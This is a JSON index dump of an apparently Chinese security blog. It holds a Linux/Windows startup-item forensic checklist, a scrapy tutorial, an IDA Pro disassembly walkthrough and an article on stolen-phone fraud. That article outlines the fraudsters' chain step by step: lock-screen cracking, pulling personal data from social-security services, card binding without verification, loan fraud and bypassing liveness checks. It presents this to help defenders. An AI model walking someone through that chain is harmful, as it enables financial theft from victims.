~/enabled_services.txt\n开机启动项检查 chkconfig （第9步） chkconfig 在没有参数运行时，显示用法。如果加上服务名，那么就检查这个服务是否在当前运行级启动。如果是，返回true，否则返回false。如果在服务名后面指 定了on，off或者reset，那么chkconfi 会改变指定服务的启动信息。on和off分别指服务被启动和停止，reset指重置服务的启动信息，无论有问题的初始化脚本指定了什么。on和off开 关，系统默认只对运行级3，4，5有效，但是reset可以对所有运行级有效。\n参数用法： –add 增加所指定的系统服务，让chkconfig指令得以管理它，并同时在系统启动的叙述文件内增加相关数据。\n–del 删除所指定的系统服务，不再由chkconfig指令管理，并同时在系统启动的叙述文件内删除相关数据。\n–level\u003c等级代号\u003e 指定读系统服务要在哪一个执行等级中开启或关毕。\n等级0表示：表示关机\n等级1表示：单用户模式\n等级2表示：无网络连接的多用户命令行模式\n等级3表示：有网络连接的多用户命令行模式\n等级4表示：不可用\n等级5表示：带图形界面的多用户模式\n等级6表示：重新启动\n需要说明的是，level选项可以指定要查看的运行级而不一定是当前运行级。对于每个运行级，只能有一个启动脚本或者停止脚本。当切换运行级时，init不会重新启动已经启动的服务，也不会再次去停止已经停止的服务。\nchkconfig –list [name]：显示所有运行级系统服务的运行状态信息（on或off）。如果指定了name，那么只显示指定的服务在不同运行级的状态。\nchkconfig –add name：增加一项新的服务。chkconfig确保每个运行级有一项启动(S)或者杀死(K)入口。如有缺少，则会从缺省的init脚本自动建立。\nchkconfig –del name：删除服务，并把相关符号连接从/etc/rc[0-6].d删除。\nchkconfig [–level levels] name：设置某一服务在指定的运行级是被启动，停止还是重置。\n有的版本没有chkconfig，安装方法：\n1.sudo apt install sysv-rc-conf安装该软件\n2.sudo cp /usr/sbin/sysv-rc-conf /usr/sbin/chkconfig\nERROR：Unable to locate package sysv-rc-conf\n解决办法：deb http://archive.ubuntu.com/ubuntu/ trusty main universe restricted multiverse\n用法\nchkconfig –list #列出所有的系统服务 chkconfig –add httpd #增加httpd服务 chkconfig –del httpd #删除httpd服务 chkconfig –level httpd 2345 on #设置httpd在运行级别为2、3、4、5的情况下都是on（开启）的状态 chkconfig –list #列出系统所有的服务启动情况 chkconfig –list mysqld #列出mysqld服务设置情况 chkconfig –level 35 mysqld on #设定mysqld在等级3和5为开机运行服务，–level 35表示操作只在等级3和5执行，on表示启动，off表示关闭 chkconfig mysqld on #设定mysqld在各等级为on，“各等级”包括2、3、4、5等级** **\n参考：\nchkconfig 原理部分 https://www.cnblogs.com/yujianadu/p/10973896.html\n启动设置手动检查 /etc/inittab（第5步） 开机后系统级别runlevel\n系统运行级别示意图：\n运行级别 含义 0 关机 1 单用户模式，可以想象为windows的安全模式，主要用于系统修复 2 不完全的命令行模式，不含NFS服务 3 完全的命令行模式，就是标准字符界面 4 系统保留 5 图形模式 6 重启动 查看运行级别命令\nrunlevel系统默认允许级别\nvi /etc/inittab id=3：initdefault 系统开机后直接进入哪个运行级别由于不同的版本不同对应不同的启动和运行级别，Linux 内核启动 init ，init进程ID是1，是所有进程的父进程，所有进程由它控制；在ubuntu环境下Ubuntu 的启动由upstart控制，自9.10后不再使用/etc/event.d目录的配置文件，改为/etc/init。查看当前的运行级别，我的Ubuntu 20.04.1桌面是5。\n参考：https://blog.csdn.net/heqiyu34/article/details/18793857\n/etc/rc.d/rc.sysinit（第6步） 本参数环境是红帽版linux，在ununtu中没有此文件。这个脚本是linux初始化脚本\n/etc/rc.d/rc.sysinit，下面是该脚本初始化的任务：\n如果devfs（设备文件系统）被使用，开启 devfs 驻留程序\n挂在 /proc 文件系统\n屏幕打印 “welcome” 终端信息\n设置终端日志级别 console log level\n卸载初始化initrd\n设置系统时钟Set the system clock\n设置hostname\n初始化 USB (通用串行总线) 控制器和HID (人机界面设备) 组建\n如果非正常关机, 在根分区运行fsck\n重新可读写挂载root文件系统\n初始化LVM (Logical Volume Manager逻辑盘卷管理器)\n激活swap交换分区\n清理和重新初始化/etc/mtab\n如果存在则运行 /etc/rc.modules 加载模块\n如果VxVM (VERITAS Volume Manager 逻辑盘卷管理器) 安装了，则启动它\n检查非root文件系统\n挂载其他文件系统\n启动图形启动显示程序信息\n检查文件系统限额\n运行多个初始化脚本，如果存在的话\n/usr/sbin/kbdconfig /usr/sbin/passwd /usr/sbin/netconfig /usr/sbin/timeconfig /usr/sbin/authconfig /usr/sbin/ntsysv 删除一些锁文件 some lock files\n初始化一些端口\n处理SCSI磁带/磁盘\n加载 USB 存储\n开启防火墙\n参考：http://glennastory.net/boot/sysinit.html\n/etc/rc.d/rc[0~6].d (第9步) 查看自定义的开机程序开机启动配置文件\ncat /etc/init.d/rc.local (cat /etc/init.d/rc) /etc/rc.d/rc[0~6].d ls -alt /etc/init.d例子:当我们需要开机启动自己的脚本时，只需要将可执行脚本丢在/etc/init.d目录下，然后在/etc/rc.d/rc*.d中建立软链接即可\nroot@localhost ~]# ln -s /etc/init.d/sshd /etc/rc.d/rc3.d/S100ssh此处sshd是具体服务的脚本文件，S100ssh是其软链接，S开头代表加载时自启动；如果是K开头的脚本文件，代表运行级别加载时需要关闭的。\n入侵排查：\n启动项文件：\nmore /etc/rc.local\n/etc/rc.d/rc[0~6].d\nls -l /etc/rc.d/rc3.d/\n/etc/profile.d（第10步之前） 登录自动执行程序\n目录中存放的是一些应用程序所需的启动脚本，其中包括了颜色、语言、less、vim及which等命令的一些附加设置。 当一个用户登录Linux系统或使用su -命令切换到另一个用户时，也就是Login shell 启动时，首先要确保执行的启动脚本就是 /etc/profile.d 。（只有Login shell启动时才会运行 /etc/profile.d 这个脚本，也就是需要输入账号和密码的时候，而Non-login shell 不会调用这个脚本） 这些脚本文件之所以能够 被自动执行，是因为在/etc/profile.d中使用一个for循环语句来调用这些脚本。而这些脚本文件是用来设置一些变量和运行一些初始化过程的。 常用语句：\ncd /etc/profile.d\ngrep -r “.” /etc/profile.d\n样本举例 2021年8月19日微软披露的mozi样本细节中，我们可以看到通过CVE-2015-1328获取写权限后，mozi样本就可以在/etc/rc.d以及/etc/init.d中写入脚本，进一步加固持久化在/etc/rcS.d 和/etc/rc.local中添加自启动。 Windows下启动项检查 开机启动项 msconfig 进入系统配置查看\n注册表查看 （1）HKEY_CLASSES_ROOT（HKCR）：此处存储的信息可确保在Windows资源管理器中执行时打开正确的程序。它还包含有关拖放规则、快捷方法和用户界面信息的更多详细信息。（2）HKEY_CURRENT_USER（HKCU）：包含当前登录系统的用户的配置信息，有用户的文件夹、屏幕颜色和控制面板设置。\n（3）HKEY_LOCAL_MACHINE（HKLM）：包含运行操作系统的计算机硬件特定信息，有系统上安装的驱动器列表及已安装硬件和应用程序的通用配置。\n（4）HKEY_USERS（HKU）：包含系统上所有用户配置文件的配置信息，有应用程序配置和可视设置。（5）HKEY_CURRENT_CONFIG（HCU）：存储有关系统当前配置的信息。\nreg或者运行“regedit”\nreg query \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" 恶意样本示例： 我们在分析Geerban勒索病毒样本17425e830d17ca6709237cb8a02f8ed1的时候，可以看到，在注册表中恶意样本添加了启动项，正是HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run，通过注册表查询即可查询到异常\n",
    "description": "",
    "tags": null,
    "title": "启动项检查",
    "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E5%90%AF%E5%8A%A8%E9%A1%B9%E6%A3%80%E6%9F%A5/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "python",
    "uri": "/%E7%BC%96%E7%A8%8B/python/index.html"
  },
  {
    "content": "如何使用pip安装scrapy 参考：https://www.simplified.guide/scrapy/install-using-pip\nscrapy是一个基于python的web爬虫。可以在python包索引(https://pypi.org/)中找到。这意味着可以通过pip安装scrapy。尽管通过pip安装的scrapy是一个很好的方式测试和融入现有的系统环境中，但是通过该渠道更新的包有可能不是最新版本的。\n安装scrapy步骤 通过pip安装 pip3 install scrapy 运行scrapy /home/user/.local/bin/scrapy\n添加pip安装路径到环境变量（linux下没有pip环境的） $ echo PATH=$PATH:/home/user/.local/bin \u003e\u003e ~/.bashrc #Linux 运行scrapy scrapy\n** 这里由于使用mac下面是是mac安装scrapy的方法**\n下载安装 安装xcode命令行工具 安装scrapy pip3 install scrapy 初始化scrapy 如果想要在桌面上创建一个工程 cd /user/xt/desktop scrapy startproject yourproject ** 未找到scrapy命令情况**\n首先找到scrapy的位置（我这里mac的安装位置找到在这里，可执行） /System/Volumes/Data/Users/xt/Library/Python/3.8/bin/scrapy $ /System/Volumes/Data/Users/xt/Library/Python/3.8/bin/scrapy Scrapy 2.3.0 - no active project Usage: scrapy \u003ccommand\u003e [options] [args] Available commands: bench Run quick benchmark test commands fetch Fetch a URL using the Scrapy downloader genspider Generate new spider using pre-defined templates runspider Run a self-contained spider (without creating a project) settings Get settings values shell Interactive scraping console startproject Create new project version Print Scrapy version view Open URL in browser, as seen by Scrapy [ more ] More commands available when run from project directory Use \"scrapy \u003ccommand\u003e -h\" to see more info about a command 如果没有找到可以直接在系统搜索：find / -name “scrapy” 2\u003e/tmp/null\n创建软连接到系统命令 ln -s /System/Volumes/Data/Users/xt/Library/Python/3.8/bin/scrapy /usr/local/bin/scrapyscrapy上手基本配置 如何使用scrapy创建rss 参考： https://www.simplified.guide/scrapy/scrape-rss\nrss通常是用xml格式编写的最新的网站更新内容的片段。一个很好的方法就是使用scrapy去获取最新的网站更新内容。\n使用scrapy创建rss订阅方法 打开rss页面 点开rss页面内容并扩展 注意：rss页面是一个xml格式的文档，网站的更新内容通常都在channel—item元素下面。 在命令行中通过scrapy打开rss资源，资源url通过参数的形式传入scrapy scrapy shell https://host 检查http返回状态，确保返回的状态是200 In [1]: response Out[1]: \u003c200 https://www.blog.google/rss\u003e 基于结构通过xpath搜索网站内容更新的内容 In [2]: posts = response.xpath('//channel/item')这里的格式是根据页面的结构来看 6. 检查返回的待确认的匹配的数目\n\u003eIn [3]: len(posts) Out[3]: 20 从第一个和最后一个里面取出一个元素进行测试 \u003e\u003e\u003e post[0].xpath('title/text()').extract() ['研究称北极海洋已污染：污水中发现清洗牛仔布的微纤维'] 通过每个item获取所有请求的数据。 In [6]: for item in response.xpath('//channel/item'): ...: post = { ...: 'title' : item.xpath('title//text()').extract_first(), ...: 'link': item.xpath('link//text()').extract_first(), ...: 'pubDate' : item.xpath('pubDate//text()').extract_first(), ...: } ...: print(post) 创建scrapy根据之前的shell进程的配置编写爬虫 import scrapy class ScrapeRssSpider(scrapy.Spider): name = 'scrape-rss' allowed_domains = ['https://www.blog.google/rss'] start_urls = ['http://https://www.blog.google/rss/'] def start_requests(self): urls = [ 'https://www.blog.google/rss', ] for url in urls: yield scrapy.Request(url=url, callback=self.parse) def parse(self, response): for post in response.xpath('//channel/item'): yield { 'title' : post.xpath('title//text()').extract_first(), 'link': post.xpath('link//text()').extract_first(), 'pubDate' : post.xpath('pubDate//text()').extract_first(), } 测试爬虫功能 scrapy crawl --nolog --output -:json scrape-rss创建一个baidu爬虫 参考：https://www.jianshu.com/p/e33d0d0b10de\n先创建一个项目：\nscrapy startproject spider cd ./spider用命令行创建一个名为baiduspi的爬虫：\nscrapy genspider baiduspi \"baidu.com\"启动爬虫\nscrapy crawl baiduspi",
    "description": "",
    "tags": "学习,爬虫",
    "title": "scapy",
    "uri": "/%E7%BC%96%E7%A8%8B/python/scrapy%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "Tag - 学习,爬虫",
    "uri": "/tags/%E5%AD%A6%E4%B9%A0%E7%88%AC%E8%99%AB/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "编程",
    "uri": "/%E7%BC%96%E7%A8%8B/index.html"
  },
  {
    "content": "前文还是老骆驼今天发的超长文，完整的记录了整个手机丢失到积极避免损失的过程，通过整个过程基本上可以梳理一遍整个手机黑产过程了，这里渐渐干货捞捞作为安全行业需要关注的几点梳理一下。\n分子实验室——www.molecule-labs.com\n一个是对于社工的基础漏洞的挖掘是否在社工相关或者逻辑漏洞上缺乏更高的视角发觉漏洞，文中提到的一些问题点在黑产的角度都是比较成体系的利用链，那么目前大家在做的渗透是否存在不足或存在漏洞不被重视，值得思考；一个是在以往攻防的过程中不会考虑更多利用的可能性（至少红队目前还没有看到偷手机地步，不过倒也是个不错的思路）本文也从红队的角度反向梳理了下值得学习的点；最后从日常所有人都应该注意的需要防范的点出发我们可以有哪些通过老骆驼这次经验可以借鉴的防范点呢，作为手册或者关注点，这里进行了相关梳理，供大家参考。\n社工漏洞基础 运营商基础 10000挂失可以通过原手机号打电话解挂\n手机密码找回 可以远程解锁屏幕锁屏密码 华为、小米\n支付宝漏洞 绑定快捷卡不需要验证 人脸识别可被绕过 风控严格\n美团漏洞 放贷风控审批不严格 绑卡验证不严 风控不严\n苏宁金融漏洞 放贷风控审批不严格 可购买各种虚拟卡 绑卡验证不严 风控不严\n银联云闪付漏洞 绑卡验证不严 风控不严\n财付通漏洞 绑卡验证不严 风控严格\n京东漏洞 虚拟卡交易 风控不严\n通用支付机构漏洞 允许用不同的手机号码注册相同实名认证的支付账号，允许两个账号绑定相同的银行卡，实名认证有人脸活体识别技术的都被绕过了\n手机丢失后防范 第一时间要做的事 报警 电话方面操作 拨打营业厅电话挂失手机卡，修改服务密码 不断拨打电话，前期用于判断手机是何状态，后期判断是否挂失成功或是否解挂失（这里可以通过电话解挂失） 实时监控找回我的手机功能手机是否上线 登陆运营上营业厅关闭短信功能，关闭呼叫转移功能，并修改营业厅相关密码 立即到营业厅申请补卡 社保局 第一时间登陆app，如果无法登陆密码被修改，则可能被修改，要引起警惕并同时尽快操作后续的操作，可尝试防止更多损失。 银行卡支付宝微信等操作 联系银行冻结信用卡 注意排查特殊信用卡如etc信用卡 登陆所有银行网银把可赎回的理财全部赎回 活期余额全部转移亲人账户 微信、支付宝资金转移亲人账户，并且删除所有信用卡 微信、支付宝立刻联系客服申请冻结 冻结所有银行卡之后还需要做 修改所有银行卡预留手机号 快捷支付管理删除绑定快捷支付公司 购物网站操作 京东、美团、饿了么、淘宝、苏宁、国美等修改手机号 防止借贷行为 借贷发放到银行卡 这里借款取款肯定需要用到银行密码，检查是否支付密码和银行卡密码一致 借贷发放新绑定银行卡 借贷发放 运营商服务密码错误情况下挂失 提供身份证号 上个月联系过的三个电话号码进行挂失 支付宝、微信被挤下线手机设备型号完全一致意味着手机锁屏被破解 事后追溯 通过运营商导出通话记录和短信记录查询 手机卡插入其他手机需要判断本机号码用一定会发给另一个小偷使用的手机 社工攻击角度 第一时间获取手机号、身份证、银行卡等信息 远离现场，手机关机，取出原电话卡并换其他手机 通过社保局套取信息 12333社保局 忘记密码可获取社保信息 手机号找回 社保app手机登陆可获取个人信息 社保可快速绑定卡 手机厂商修改密码 找到查找我的手机，并解绑 运营商 遇到挂失情况 尝试修改运营商服务密码拖延挂失、或解挂失 补办卡情况 开启呼叫转移 破解手机锁屏 尝试支付宝、微信、银行卡 余额、银行卡、借贷等 风控不严格的支付公司尝试借贷 绑定信用卡目前很多不用验证有效日期和cvv（身份信息+卡号+预留手机号） 美团借贷等等 借贷之后通过充值卡等银联转账转走钱 修改密码 修改支付密码 修改支付宝手机号 通过支付密码可查看银行卡完整卡号 绕过活体检测黑产通道 尝试购物app 免密支付、绑定银行卡等 建立新的账号绑定银行卡 绕过实名认证 设置新账号 支付宝 苏宁 京东 云闪付 财付通 苏宁金融 日常防范注意 给手机设置屏幕锁 设置卡锁 https://ti.dbappsecurity.com.cn/informationDetail/1148 冻结所有银行卡之后还需要做 修改所有银行卡预留手机号 快捷支付管理删除绑定快捷支付公司 存在快捷支付绑定的支付公司解绑后登陆排查 日常防范陌生电话诈骗钓鱼等 ",
    "description": "",
    "tags": "科普",
    "title": "手机丢失后一定要做的几件必做事！",
    "uri": "/%E7%A7%91%E6%99%AE/%E6%89%8B%E6%9C%BA%E4%B8%A2%E5%A4%B1%E5%90%8E%E4%B8%80%E5%AE%9A%E8%A6%81%E5%81%9A%E7%9A%84%E5%87%A0%E4%BB%B6%E5%BF%85%E5%81%9A%E4%BA%8B/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "Tag - 科普",
    "uri": "/tags/%E7%A7%91%E6%99%AE/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "科普",
    "uri": "/%E7%A7%91%E6%99%AE/index.html"
  },
  {
    "content": "使用IDA反汇编 代码分析常用语了解恶意样本内部源码不可见时使用。\n1. 代码分析工具 代码分析工具可以根据他们的功能、描述、数量进行分类。 反汇编程序是一个可以将机器语言转汇编代码；并且可以静态代码分析。静态代码分析可以在不执行二进制程序的时候让你了解到程序的行为。\n一个调试器是个应用程序同时也是可以反汇编代码；除此之外也可以执行控制汇编二进制执行。使用调试工具，你不仅可以执行单条指令，或选择函数，或执行整个程序。调试工具可以动态分析，还可以在程序执行的过程中检查可疑的二进制。\n反编译器是一个将机器码转成更高级语言的程序（伪代码）。反编译器能够很好辅助反推工程进程并能够简化工作。\n2. 静态代码分析（使用IDA反汇编） Hex-Rays IDA pro https://www.hex-rays.com/products/ida/ IDA是最有影响力且流行的商业反编译调试工具；常被用于逆向工程，恶意病毒分析以及脆弱性研究。IDA可以运行在不同平台（macOS、Linux和windows）支持分析不同的文件类型（PE/ELF/Macho-O）。除商业版本之外，IDA还提供2个其他版本：IDA demo版本（评估版本）和IDA免费版本；两个版本都有一定的限制，都可以反编译32和64位windows程序，但是免费版无法调试二进制，demo版本无法调试64位二进制，demo版本也无法保存数据库，并且demo版本和免费版都无法支持IDApython。\n本部分和下一部分将会看下IDA pro的特征，并且使用IDA施行静态代码分析。这一部分仅包含与恶意代码分析相关的功能。\nIDA相关深入了解图书推荐《The IDA Pro Book》by Chris Eagle\n2.1 在IDA中加载二进制 IDA会像windows一样加载文件到内存中。IDA可以通过判断文件头确定最可能适合的加载器。在选择文件后IDA会加载对话框，用于确认合适的加载起和进程类型。文件设置（file option）选项是用于加载未识别的文件，一般使用该选项处理shellcode。默认情况下IDA不会在反编译中加载PE头和源部分。通过使用手动加载checkbox选项，可以手动选择加载基址和加载位置，IDA将会在加载的每个部分包括PE头给予相应的提示。点击OK，IDA将文件加载到内存，并且开始反编译相关代码。\n2.2 扩展IDA显示 IDA桌面版结合了很多静态分析工具的特征到一个单独特窗口中。下面将对IDA卓敏啊版和它不同窗口进行介绍。其包含多个不同的标签（IDA View,Hex View-1,等等），也可以通过点击添加标签按钮或者点击View/open subviews菜单进行添加。\n2.2.1 反汇编窗口 当二进制文件被加载，IDA展示的窗口就是反汇编编辑窗口（也叫做IDA-view窗口），这是个主要窗口，用于分析和展示反汇编代码，并且可以用于分析反汇编二进制。 IDA可以使用两个模式展示反编译的代码：Graph view（graph diassembly view）和Text view（实际应该叫text diassembly view）,默认进入的是graph view，这里可以使用空格快捷键进行切换。 在graph view模式下，IDA一次只显示一个函数，在一个流程图的窗口中函数在基本块区中断。这个模式可以快速识别分支和循环生命。在Graph view模式下，颜色和箭头的指示方向都是根据判断显示的。条件跳转使用红色和绿色的箭头，true条件用绿色箭头表示，false使用红色箭头表示。蓝色的箭头是被用来表示无条件跳转，循环使用的是向上的蓝色的箭头表示。在graph view中虚拟地址默认不显示（每个基础块仅显示最基本的信息展示）。如果需要显示虚拟地址信息，需要点击Options/general然后点击Line prefixes以启用。 下图中可以观察到条件跳转中，绿色箭头（条件true）进行跳转，对应的虚拟地址也是跳转，而红色箭头指向正常的数据流，虚拟地址为连续。 在text view模式中，整个反编译目前处于线性方式展示。整个虚拟地址默认展示，\u003csection name\u003e:\u003cvirtual address\u003e格式。在text view窗口中最左边的部分被称为箭头窗口，用于展示程序的非线性流。虚线箭头代表条件跳转，实线箭头表示无条件跳转，加粗的箭头表示循环。 2.2.2 函数窗口function widnow 函数窗口显示所有IDA识别出来的函数，该床扣同时也显示每个函数可以被找到的虚拟地址，每个函数的大小，以及其他函数相关信息。双击可以定位跳转到对应函数的位置。每个函数与大量的标志相关联（例如R、F、L等等标志）。通过F1按钮可以获取更多关于相关标志的帮助信息。一个有用的标志L标志，代表函数的库函数。库函数是编译器产生而非恶意软件作者编写的函数；从代码分析的角度来看，恶意样本分析的重点应该在恶意代码上，而不是库函数本身。\n2.2.3 输出窗口out window 输出窗口展示的是IDA以及IDA插件输出的相关信息。这些对于分析恶意样本以及样本对系统操作分析提供很多信息。可以通过查看输出在output窗口的内容可以获取IDA执行加载过程中的相关信息。\n2.2.4 十六进制窗口Hex view window 通过点击HexView-1标签可以展示Hex窗口。Hex窗口可以展示一系列的十六进制转储内容以及ASCII字符。默认情况下，十六进制窗口（hex window）。默认情况下十六进制窗口同步反编译窗口（disassembly window）内容；也就是在反汇编窗口中选择了一部分字节的数据，相应的在十六进制窗口中同样的会进行标记高亮相关的内容，这对于标记内存地址很有帮助。\n2.2.5 结构窗口structures window 点击structures windows标签，可以进入借口窗口。结构窗口展示程序使用的标准的数据结构，并且允许创建自建的数据结构。 2.2.6 引用窗口imports window 引用窗口是所有二进制程序引用的函数的列表。展示了引用的函数以及相关函数引用的库函数内容。 2.2.7 出口窗口exports window 出口窗口展示的是程序出口函数的列，出口函数通常在DLL动态链接库中，因此对于分析恶意样本DLL时有用。\n2.2.8 字符窗口string window IDA默认不展示字符窗口，你可以通过点击view/open subviews/strings（或者使用Shift+F12快捷方式打开）字符窗口。字符窗口展示的是从二进制和地址中能够发现字符列表。默认情况下，字符窗口仅展示长度不小于5的null-terminated ASCII字符串。有些恶意样本的二进制使用的是UNICODE字符。可以通过配置IDA显示不同的字符，右击Setup（或者Ctrl+U）检测Unicode C-style（16比特），点击ok即可。 2.2.9 段窗口segments window 段窗口可以通过view/open subviews/segments（或者使用shift+F7开启）。段窗口是展示（.text,.data等等）部分内容的列表。显示信息包括开始地址，以及结束地址，每个部分的内存权限。开始和结束的地址都有每个部分的虚拟地址的详细说明，可用于定位对应内存中的位置。\n2.3 使用IDA提高反汇编 本部分将结合之前相关的知识内容进行反编译分析。考虑下面一个小程序从一个本地函数拷贝到另外一个变量中：\nint main() { int x=1; int y; y=x; return 0; }以上代码编译之后在IDA反汇编之后如下：\n.text:00401000 ; Attributes: bp-based frame ➊ .text:00401000 .text:00401000 ; ➋ int __cdecl main(int argc, const char **argv, const char **envp) .text:00401000 ➐ _main proc near .text:00401000 .text:00401000 var_8= dword ptr -8 ➌ .text:00401000 var_4= dword ptr -4 ➌ .text:00401000 argc= dword ptr 8 ➌ .text:00401000 argv= dword ptr 0Ch ➌ .text:00401000 envp= dword ptr 10h ➌ .text:00401000 .text:00401000 push ebp ➏ .text:00401001 mov ebp, esp ➏ .text:00401003 sub esp, 8 ➏ .text:00401006 mov ➍ [ebp+var_4], 1 .text:0040100D mov eax, [ebp+var_4] ➍ .text:00401010 mov ➎ [ebp+var_8], eax .text:00401013 xor eax, eax .text:00401015 mov esp, ebp ➏ .text:00401017 pop ebp ➏ .text:00401018 retn当加载可执行之后，IDA在每一个函数执行分析，反汇编确定栈框架。除此之外，使用大量的签名和运行特殊算法匹配提供IDA识别反汇编函数。注意到➊在执行过初始化分析之后，IDA添加了一个批注，用分号开头；这意味着ebp寄存器被局部变量和函数参数使用（前章节提到的函数在ebp堆栈寄存器基址中）。在➋中，IDA使用其规则可以确定main函数并添加在关于此函数的批注，这一特点可以用于确定函数需要接收多少个参数，以及参数的类型。\n在➌中，IDA提供了一个总的栈的视角，IDA能够判断局部变量和函数参数。在主函数中IDA定义两个局部变量，并自动命名为var_4和var_8并分别赋值。-4和-8对应着与dbp（框架指针）的距离。➍和➎是IDA替换[ebp-4]与[ebp-8]的内容。\nIDA会自动对变量或参数进行命名，并在代码中应用这些名称；IDA标记的var_xxx和arg_xxx可以节约人工标记并替换参数的工作，并便于识别变量名和参数。\nfunction prologue, funcktion epilogue和在➏中用于分配的空间给局部变量的指令可以简易的忽略。这些函数仅用于设定函数的环境。梳理之后汇编代码简化为：\n.text:00401006 mov [ebp+var_4], 1 .text:0040100D mov eax, [ebp+var_4] .text:00401010 mov [ebp+var_8], eax .text:00401013 xor eax, eax .text:00401018 retn2.3.1 重命名地址 当分析恶意病毒的时候，可以将这些变量或函数改成更有意义的名字。有劲啊变量或者参数名，选择重命名（rename或者按快捷键“N”）。当重命名之后IDA将会同步新名字到与其相关的项目上。通过重命名可以给予变量或函数更加有意义的名字。\n.text:00401006 mov [ebp+x], 1 .text:0040100D mov eax, [ebp+x] .text:00401010 mov [ebp+y], eax .text:00401013 xor eax, eax .text:00401018 retn2.3.2 IDA标注功能 标注对于提示某一函数的作用很有帮助。为了添加一个合规的注释，首先将光标放在任何一个反编译列表里的一行中，然后使用快捷键（“:”），通过在新的对话框中填写相关信息并确定，完成相关备注。\n.text:00401006 mov [ebp+x], 1 .text:0040100D mov eax, [ebp+x] .text:00401010 mov [ebp+y], eax .text:00401013 xor eax, eax .text:00401018 retn常规的备注对于单行描述但行比较有用（多行也可以），但是如果可以把描述汇总到一起描述，类似主函数的描述就更好了。IDA提供了另一种备注，函数备注，允许组合备注，并且可以显示在函数反汇编列中。首先选择函数所在的虚拟地址，然后通过快捷键“:”添加备注即可，这里为sub_140001230，伪代码添加函数备注。可以看到这些备注与函数使用相同的虚拟地址。 当前相关修改参数变量名称、添加备注的名称都只保存在IDA的数据库中，并没有保存在二进制可执行文件中。\n2.3.3 IDA 数据库 当可执行文件加载到IDA中，就会在工作目录中创建一个数据库该数据库一共包含5个文件（扩展名为：.id0,.id1,.nam,.id2以及.til）。每一个文件保存了大量的与可执行文件匹配的相关信息。这些文件被压缩和归档到以.idb（32进制）压缩文件中。当加载可执行程序后，从中读取创建信息保存在数据库中。大量的信息展都保存在数据库中以用于展示代码分析时有用的信息。任何的修改操作（如重命名，注释批注等等）都会显示在view中并且般存在数据库中，但是这些修改并不会修改原二进制文件。你可以通过关闭IDA保存数据库；当关闭IDA的时候将会提示是否保存数据库的提示框。默认情况下数据库包配置（默认配置）会将所有文件保存在IDB（.idb）或者i64（.i64）。当重新打开.idb或者.i64文件的时候，会看到重命名的变量和标注都在。\n下面通过另一个简单的程序了解IDA的其他扩展特征。全局变量a、b，在主函数中赋值。参数x、y以及string为局部变量；a赋值给x，y和string都是保存的地址。\nint a; char b; int main() { a = 41; b = 'A'; int x = a; int *y = \u0026a; char *string = \"test\"; return 0; } 程序转化为下面的反汇编列表。IDA也定义了全局变量和匹配名字例如dword_403374和byte_403370；记录如何补充内存地址并且在全局变量中被关联。当一个变量被定义之后在全局数据区域，对编译器来说变量的地址和变量的大小是明确的。全局的假的变量名被IDA详细知名变量的地址以及他们确切的数据类型。例如dword_403374则是说地址为0x403374可以接受dword（4bytes大小）的值。\nIDA使用offset关键字表示变量地址被使用（而不是现实他们的值），当var_8、var_c被分配局部变量值时，可以认为他们被分配了值（指针变量值）。IDA使用aTest给地址确定字符（字符变量），这个名用于表示字符串，test用于添加批注，\n.text:00401000 var_C= dword ptr -0Ch ➊ .text:00401000 var_8= dword ptr -8 ➊ .text:00401000 var_4= dword ptr -4 ➊ .text:00401000 argc= dword ptr 8 .text:00401000 argv= dword ptr 0Ch .text:00401000 envp= dword ptr 10h .text:00401000 .text:00401000 push ebp .text:00401001 mov ebp, esp .text:00401003 sub esp, 0Ch .text:00401006 mov ➋ dword_403374, 29h .text:00401010 mov ➌ byte_403370, 41h .text:00401017 mov eax, dword_403374 ➍ .text:0040101C mov [ebp+var_4], eax .text:0040101F mov [ebp+var_8], offset dword_403374 ➎ .text:00401026 mov [ebp+var_C], offset aTest ; \"test\" ➏ .text:0040102D xor eax, eax .text:0040102F mov esp, ebp .text:00401031 pop ebp .text:00401032 retn2.3.4 格式化转化操作数 在➋和➌中操作数(29h和41h)代表16进制格式数值，然而在源码中我们使用十进制的41和字符“A”。IDA可以将16进制值编码为十进制、八进制、二进制。ASCII也可以转为字符型。例如，如果要修改41h格式的值，右击在这个值上选择即可。 2.3.5 导航地址 IDA的另一个特征是可以在程序中导航任意地址更加方便。当程序被反编译，IDA就会标记每一个程序中的地址，双击字符则会在显示中跳转到对应字符所在的位置。如函数名或变量。 IDA保持跟踪导航历史；任何时候被重定向到另外一个地址，都可以使用返回按钮返回之前的地址。 跳转到指定地址可以点击jump/jump to Address（或者使用快捷键G)来跳转到地址。点击OK完成跳转。\n2.3.6 交叉参考cross References 其他方式导航是通过交叉参考实现（也称为Xrefs）。交叉参考链接与地址链接关联。交叉参考可以不仅数据交叉，也可以代码交叉参考。\n数据交叉参考描述了数据在二进制中如何交互。如➐、➑、➒。例如数据交叉，➑描述的是数据与命令相关联，从主函数开始偏移0x6长度。字符w表示一个交叉关联写；代表命令写入内存地址。字符r代表读相互关联，代表从内存中读取信息。省略号...代表更多相关联，但是他们由于显示限制不能显示。其他种类的关联数据是一个补充（使用o表示），代表地址正在被使用，而不是内容。数组和字符型数组被开始的地址使用，因为字符数据➐被标记为一个参考偏移值。\n.data:00403000 aTest db 'test',0 ➐; DATA XREF: _main+26o Similarly, double-clicking on the address dword_403374 relocates to the virtual address shown here: .data:00403374 dword_403374 dd ? ➑; DATA XREF: _main+6w .data:00403374 ➒; _main+17r ...一个代码交叉参考代表一个到另一个的数据流（如jump或者function调用），下面显示的一个c语言的if语句：\nint x = 0; if (x == 0) { x = 5; } x = 2; 